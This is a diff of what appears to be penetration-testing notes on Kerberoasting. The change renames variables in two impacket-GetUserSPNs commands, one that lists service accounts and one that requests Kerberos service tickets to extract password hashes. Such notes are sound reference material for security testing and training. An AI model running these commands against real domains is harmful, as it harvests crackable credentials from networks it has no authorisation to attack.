@@ -130,13 +130,13 @@ The attacker impersonates an account user with a service principal name (SPN) an
 Check if vulnerable accounts are present:
 
 ```shell
-impacket-GetUserSPNs -dc-ip $TARGET_IP $TARGET_DOMAIN/$USERNAME
+impacket-GetUserSPNs -dc-ip $TARGET_IP $DOMAIN/$USER
 ```
 
 Send request to TGS and extract the hash:
 
 ```shell
-impacket-GetUserSPNs -dc-ip $TARGET_IP $TARGET_DOMAIN/$USERNAME -request
+impacket-GetUserSPNs -dc-ip $TARGET_IP $DOMAIN/$USER -request
 ```
 
 #kerberoasting #rubeus
